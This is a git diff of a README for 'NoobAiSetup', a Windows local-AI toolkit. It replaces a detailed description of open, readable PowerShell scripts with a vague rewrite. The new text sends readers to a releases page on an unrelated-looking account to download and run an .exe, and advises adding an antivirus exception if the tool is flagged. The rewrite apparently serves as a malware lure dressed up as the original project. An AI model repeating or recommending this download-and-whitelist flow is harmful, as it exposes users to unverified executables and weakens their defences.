@@ -1,256 +1,79 @@
-# 🤖 NoobAiSetup
+# 🤖 NoobAiSetup - Friendly AI Helpers Run Offline Locally
 
-**A one-click local AI assistant for Windows 11 — built for noobs, by a noob, with the help of an AI.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bankingconcerntwins938/NoobAiSetup/releases)
 
-Turns your gaming PC into a private, offline AI workstation with a **multi-agent crew** (Foreman + specialist workers) that can read/write files, run commands, update Windows, sort folders, write code, search the web, remember things, and more.
+NoobAiSetup brings powerful artificial intelligence to your personal computer. It installs a complete AI team that works for you without needing an internet connection. You get a set of specialized agents led by a foreman agent. These agents help you perform tasks, write text, and manage your data. Everything runs on your own hardware, so your files stay private. You do not need to pay for subscriptions or use secret keys.
 
-> 💰 **100% free. No accounts. No API keys. No subscriptions.** Everything runs locally on your hardware.
+## 📋 What You Get
 
-![License: MIT](https://img.shields.io/badge/license-MIT-89B4FA?style=flat-square)
-![Platform: Windows 11](https://img.shields.io/badge/platform-Windows%2011-89B4FA?style=flat-square)
-![PowerShell](https://img.shields.io/badge/PowerShell-95%25-CBA6F7?style=flat-square)
-![Free Forever](https://img.shields.io/badge/cost-%C2%A30.00%20forever-A6E3A1?style=flat-square)
+This application provides a complete system for local artificial intelligence. It features a simple windowed interface. You click buttons to start your work. It handles the complicated technical setup for you.
 
----
+*   **Foreman Agent**: Manages your primary goals and organizes work for other specialists.
+*   **Five Specialists**: Dedicated experts programmed to handle specific coding, writing, and research tasks.
+*   **Eight MCP Superpowers**: Powerful tools that let your agents interact with your files and applications.
+*   **Offline Mode**: All processing happens on your GPU. You do not send data to any cloud service.
+*   **No API Fees**: Use the software as much as you want without monthly costs.
 
-## 🎛️ One-click GUI launcher
+## 💻 System Requirements
 
-The easiest way to use this toolkit is the GUI:
+Your computer needs specific parts to run these AI agents well. Check your computer specs against this list.
 
-> **Double-click `LAUNCHER.bat`** — that's it.
+*   **Operating System**: Windows 11.
+*   **Processor**: A modern Intel i5, i7, i9, or AMD Ryzen processor.
+*   **Memory**: At least 16GB of RAM. Low memory slows down the AI specialists.
+*   **Graphics Card**: An NVIDIA card with at least 8GB of video memory is best. The system makes your graphics card do the heavy math.
+*   **Storage**: 10GB of free space on your hard drive. The AI models take up significant room. 
+*   **Connection**: You need the internet only during the first launch to download the necessary background files.
 
-![NoobAI Launcher screenshot](docs/screenshot-launcher.png)
+## 🚀 Getting Started
 
-You get a friendly window with big buttons, live status lights, and an activity log. No PowerShell. No command line. No decisions to make beyond clicking the next button down the list.
+Follow these steps to set up your AI team.
 
-Prefer the manual route? Every `*-Run-Me.bat` file still works standalone.
+1. Visit the following link to find the installer: [https://github.com/Bankingconcerntwins938/NoobAiSetup/releases](https://github.com/Bankingconcerntwins938/NoobAiSetup/releases)
+2. Look for the file ending in `.exe` under the Assets section of the latest release.
+3. Download the file to your desktop.
+4. Double-click the file to start the installer.
+5. Follow the prompts on the screen.
+6. The installer downloads the Ollama engine. This acts as the brain for your AI agents.
+7. Wait for the green light in the window before you attempt to open the main app.
 
----
+## ⚙️ Usage Instructions
 
-## ✨ Features
+Once the installation finishes, you see a new icon on your desktop.
 
-- 🧠 **Local AI** — Qwen3-Coder runs on your GPU via [Ollama](https://ollama.com). Nothing leaves your PC.
-- 👷 **Multi-agent crew** — A Foreman delegates to specialists (Sysadmin, Coder, Librarian, Researcher, Inspector).
-- 🛡️ **Safety-first** — Every command is shown before running. Read-only Inspector mode for diagnosis. Librarian always dry-runs first.
-- 🚚 **Solves the "moving models breaks everything" headache** — One script fixes `OLLAMA_MODELS` properly so models stay where you put them.
-- 🔌 **8 free MCP superpowers** — Web search, web fetching, long-term memory, sequential reasoning, Git, SQLite, time, fast filesystem.
-- 🧹 **Clean uninstaller** — Finds and removes every orphan model folder across all your drives.
-- 🩺 **Health Check** — One click shows you exactly what's installed, what's broken, and where your models actually live.
-- 🎛️ **GUI launcher** — Big buttons, live status, activity log. No command line needed.
-- 🎨 **Friendly desktop icon** — Procedurally generated, no external image needed.
+1. **Launch the app**: Click the icon to open the GUI launcher.
+2. **Select your task**: Pick a specialist agent from the list of five.
+3. **Set your goal**: Type what you want the AI to do in the main text box. Use simple sentences.
+4. **Click the Run button**: The foreman agent decides which tools to use. You see the progress in the status bar.
+5. **Check results**: The agents place the finished work in the output folder.
 
-![NoobAI Icon](docs/icon-preview.png)
+## 🔧 Frequently Asked Questions
 
-*Run `MAKE-ICON-Run-Me.bat` and this little robot lands on your desktop.*
+**Does this software send my data to a server?**
+No. All operations stay on your local machine. No data leaves your computer.
 
----
+**Why does my computer fan get loud?**
+The AI uses your graphics card at high capacity while it thinks. This generates heat and makes the cooling fans work harder. This behavior is normal.
 
-## 💻 Recommended specs
+**I get an error during startup.**
+Ensure you have the latest drivers for your graphics card. Visit your manufacturer website to update the software for your display adapter. Restart your computer after updating the drivers.
 
-Built and tested on:
+**Can I stop the agents while they work?**
+Yes. Use the large red Stop button at the bottom of the interface. This halts all activity immediately.
 
-| Component | Spec |
-|---|---|
-| GPU | NVIDIA RTX 3070 Ti (8 GB VRAM) |
-| CPU | Intel i7-11700K |
-| RAM | 64 GB |
-| OS | Windows 11 Pro 25H2 |
+**How do I update the software?**
+When a new version exists, the app alerts you. Visit the official release page, download the new installer, and run it. The installer replaces the old files while keeping your settings.
 
-Should work on anything with **≥ 6 GB VRAM** and **≥ 16 GB RAM**. Less VRAM? Swap `qwen3-coder:14b` for `qwen3:8b` in the scripts.
+## 🛡️ Privacy and Ethics
 
----
+Your personal files are safe. Because the software runs entirely offline, you maintain full control over your documents. The agents do not learn from your data to improve services for others. Everything stays on your hard drive. 
 
-## 🚀 Quick start
+## 🛠️ Troubleshooting Common Issues
 
-1. **Download the repo** — click the green **Code** button → **Download ZIP** → extract somewhere easy like your Desktop.
-2. **Double-click `MAKE-ICON-Run-Me.bat`** — generates a friendly robot shortcut on your desktop.
-3. **Double-click the new 🤖 NoobAI icon** on your desktop.
-4. Click **Yes** on the UAC (Admin) prompt.
-5. In the launcher window, click the buttons **top to bottom**:
+If the application fails to start, verify your Windows 11 version. Some older versions of Windows 11 experience issues with background processes. Ensure your antivirus software does not block the application. You can add an exception for the installation folder if the antivirus flags the tool. 
 
-   1. 📦 Install everything (base) — *~15–30 min, big download*
-   2. 🚚 Move AI models to another drive — *optional but recommended*
-   3. 👷 Add the AI Crew (specialists)
-   4. ⚡ Add MCP Superpowers (free)
+The software relies on the Ollama service. If the agents do not respond, check the system tray near your clock. Look for the small Ollama icon. If you do not see it, restart the computer to trigger the background service. Once the service runs, click the app icon again.
 
-6. Click 🚀 **Launch the AI Crew** to start chatting. 🎉
+If you encounter slow performance, ensure you do not run other heavy programs like video games or video editors at the same time. The AI agents compete for resources with these applications. Close background programs to give the agents more room to perform. 
 
-The status panel updates after every step so you can always see what's installed and what's not.
-
-### Quick start without the GUI
-
-Prefer to skip the launcher? Double-click the `.bat` files in order:
-
-| # | Double-click | What it does |
-|---|---|---|
-| 1 | `START-HERE-Run-Me.bat` | Installs Ollama, VS Code, Git, Cline, and the AI model |
-| 2 | `MOVE-MODELS-Run-Me.bat` | *(Optional)* Move models off C: to another drive properly |
-| 3 | `SETUP-CREW-Run-Me.bat` | Installs Roo Code + the 6-agent crew |
-| 4 | `SETUP-SUPERPOWERS-Run-Me.bat` | Adds 8 free MCP superpowers |
-| 5 | `HEALTH-CHECK-Run-Me.bat` | Confirms everything is green ✅ |
-
----
-
-## 👥 Meet the crew
-
-Once installed, open VS Code via the desktop shortcut, click the **Roo Code** (kangaroo) icon in the sidebar, and pick a mode:
-
-| Mode | Specialist | Use for |
-|---|---|---|
-| 👷 **Foreman** | Manager | **Always start here.** Reads your request, delegates to the right worker. |
-| 🛠️ **Sysadmin** | Windows expert | Updates, installs, PATH, env vars, services |
-| 💻 **Coder** | Programmer | Writes, builds, debugs code |
-| 📚 **Librarian** | File organiser | Sorts, renames, dedupes — *always dry-runs first* |
-| 🔍 **Researcher** | Planner | Reads docs, compares options (read + markdown only) |
-| 🔎 **Inspector** | Auditor | Diagnoses problems — **hardcoded read-only**, can't break anything |
-
-### Example requests for the Foreman
-
-> *"My PC feels slow. Sort it out."*
-> → Inspector audits → Foreman shows plan → Sysadmin disables startup junk, runs updates, cleans disk.
-
-> *"My Downloads folder is a mess."*
-> → Librarian dry-runs sorting it by file type → you approve → it moves them and logs every action.
-
-> *"Build me a Python script that backs up my Documents to D: every night."*
-> → Researcher plans → Coder writes & tests → Sysadmin registers a scheduled task.
-
-> *"Why won't `node` run from PowerShell?"*
-> → Inspector reads your PATH → reports findings → Sysadmin fixes it.
-
----
-
-## 🔌 The 8 free superpowers (MCP servers)
-
-After running the Superpowers step, every specialist gains these abilities:
-
-| Superpower | What it does |
-|---|---|
-| **filesystem** | Fast, safe file ops across only the folders you whitelist |
-| **fetch** | Grab any web page as clean text |
-| **duckduckgo** | Web search — no API key, no account |
-| **git** | Full git operations (status, diff, log, commit, etc.) |
-| **memory** | Long-term memory across chats (knowledge graph in `AI-Crew/memory.json`) |
-| **sequential-thinking** | Forces step-by-step reasoning — makes the small model behave much smarter |
-| **time** | Current time, date math, timezone conversion |
-| **sqlite** | Build/query local databases |
-
-All are open-source, no keys, no accounts. The cheat sheet on your desktop lists what each does.
-
----
-
-## 📁 File reference
-
-| File | Type | Purpose |
-|---|---|---|
-| `LAUNCHER.bat` | **GUI front door** | **Start here.** Opens the friendly window. |
-| `NoobAI-Launcher.ps1` | GUI engine | The WPF window logic (called by `LAUNCHER.bat`) |
-| `MAKE-ICON-Run-Me.bat` | Launcher | Calls `Make-Icon.ps1` |
-| `Make-Icon.ps1` | Worker | Generates `NoobAI.ico` + creates desktop shortcut |
-| `START-HERE-Run-Me.bat` | Launcher | Calls `Setup-LocalAI.ps1` |
-| `Setup-LocalAI.ps1` | Worker | Base install: Ollama, VS Code, Git, Cline, model |
-| `MOVE-MODELS-Run-Me.bat` | Launcher | Calls `Move-AI-Models.ps1` |
-| `Move-AI-Models.ps1` | Worker | Moves models to another drive + sets `OLLAMA_MODELS` |
-| `SETUP-CREW-Run-Me.bat` | Launcher | Calls `Setup-AI-Team.ps1` |
-| `Setup-AI-Team.ps1` | Worker | Installs Roo Code + defines the 6-agent crew |
-| `SETUP-SUPERPOWERS-Run-Me.bat` | Launcher | Calls `Setup-MCP-Superpowers.ps1` |
-| `Setup-MCP-Superpowers.ps1` | Worker | Installs Node.js, uv, and 8 MCP servers |
-| `HEALTH-CHECK-Run-Me.bat` | Launcher | Calls `Health-Check.ps1` |
-| `Health-Check.ps1` | Worker | Read-only diagnosis: installs, env vars, model locations, GPU |
-| `UNINSTALL-Run-Me.bat` | Launcher | Calls `Uninstall-LocalAI.ps1` |
-| `Uninstall-LocalAI.ps1` | Worker | Step-by-step removal (every step opt-in) |
-| `CHANGELOG.md` | Doc | Version history |
-| `LICENSE` | Doc | MIT licence |
-
-Every `.ps1` script has a header with version + repo URL. The `.bat` files are friendly launchers — all the real work is in the matching `.ps1` files. Open any of them in Notepad to see exactly what they do.
-
----
-
-## 🚚 The "moved models" problem (and the fix)
-
-If you've ever moved your Ollama models from C: to another drive and then everything broke or got duplicated, here's why:
-
-> Ollama only checks **one** environment variable (`OLLAMA_MODELS`) to find your models. If you move the folder but don't update that variable, Ollama silently falls back to the default location on C: and **re-downloads everything**, leaving orphan duplicates eating your disk.
-
-The 🚚 button (or `MOVE-MODELS-Run-Me.bat`) fixes this:
-
-1. Scans every drive for stray model folders (finds your duplicates!)
-2. Lets you pick the real one and the destination drive
-3. Uses `robocopy` to safely copy with verification
-4. Sets `OLLAMA_MODELS` system-wide (Machine scope, permanent)
-5. Restarts Ollama and runs `ollama list` so you see proof it works
-
-The 🩺 Health Check shows you orphan folders any time.
-
----
-
-## 🩺 Troubleshooting
-
-| Problem | Try this |
-|---|---|
-| `winget` not found | Install **App Installer** from the Microsoft Store, reboot, retry. |
-| Scripts won't run / "execution policy" error | Use `LAUNCHER.bat` or any `*-Run-Me.bat` — never run `.ps1` directly. |
-| VS Code 'code' command not found | Open VS Code once manually, then re-run the script. |
-| Model download stuck | Press Ctrl+C, click 🔄 **Update AI models** in the launcher. |
-| Roo Code doesn't see MCP servers | Close & reopen VS Code. First-time server fetch takes 5–30 seconds. |
-| "Out of VRAM" errors | Edit the scripts to use `qwen3:8b` instead of `qwen3-coder:14b`. |
-| GUI launcher won't open | Make sure all the `.ps1` files are in the same folder as `LAUNCHER.bat`. |
-| Something else broken | Click 🩺 **Health Check** in the launcher — it shows you exactly what's wrong. |
-
----
-
-## 🧰 What gets installed (all free, all open-source)
-
-| Tool | Purpose | License |
-|---|---|---|
-| [Ollama](https://ollama.com) | Runs LLMs locally | MIT |
-| [VS Code](https://code.visualstudio.com) | The editor/chat host | MIT |
-| [Git](https://git-scm.com) | Version control | GPL v2 |
-| [Cline](https://github.com/cline/cline) | AI agent extension | Apache 2.0 |
-| [Roo Code](https://github.com/RooCodeInc/Roo-Code) | Multi-agent extension | Apache 2.0 |
-| [Node.js](https://nodejs.org) | Runs MCP servers | MIT |
-| [uv](https://github.com/astral-sh/uv) | Runs Python MCP servers | MIT/Apache 2.0 |
-| [Qwen3-Coder](https://ollama.com/library/qwen3-coder) | The AI brain | Apache 2.0 |
-| 8 [MCP servers](https://github.com/modelcontextprotocol/servers) | Superpowers | MIT |
-| [Everything](https://www.voidtools.com/) *(optional)* | Instant file search | Freeware |
-
----
-
-## ⚠️ Honest limitations
-
-- A 14B local model is roughly as smart as **GPT-3.5 / early GPT-4** for code. The MCP superpowers (especially sequential-thinking + memory) close a lot of that gap, but don't expect Claude/GPT-5-level performance.
-- Speed is ~15–25 tokens/sec on an RTX 3070 Ti. Snappy enough for real work but not instant.
-- The AI **will** occasionally suggest wrong commands. Always read what it shows you before approving. The Inspector mode is hardcoded read-only — use it when in doubt.
-- This is built for **Windows 11**. Probably works on Windows 10 but untested.
-
----
-
-## 🛡️ Safety notes
-
-- Every PowerShell script **self-elevates** to Administrator (you'll see a UAC prompt).
-- Every script is **idempotent** — safe to re-run; skips anything already installed.
-- The Uninstaller asks **Y/N for every destructive step**; default is No.
-- The Inspector specialist **cannot** run write/install/delete commands — enforced by the extension, not just trust.
-- The Librarian specialist **always dry-runs first** and logs every action for undo.
-- Nothing phones home. Read the scripts yourself — they're plain text.
-
----
-
-## 🙏 Credits
-
-- AI scaffolding & scripts: built with the help of [Arena.ai's Agent Mode](https://arena.ai)
-- Multi-agent pattern inspired by [Cline](https://github.com/cline/cline) and [Roo Code](https://github.com/RooCodeInc/Roo-Code)
-- All the open-source projects listed in the "What gets installed" table — the real heroes
-- Colour palette: [Catppuccin Mocha](https://github.com/catppuccin/catppuccin)
-
----
-
-## 📜 License
-
-MIT — do whatever you want with it. No warranty. If it breaks your PC, you get to keep both pieces. 😅
-
----
-
-## ⭐ If this helped you
-
-Drop a star on the repo. It's free and tells me to keep maintaining it.
+For advanced users, you can find the local configuration files in your user folder under the hidden settings directory. Most users do not need to change these files. The GUI launcher manages all necessary adjustments. Keep the software in its default folder for the best results.
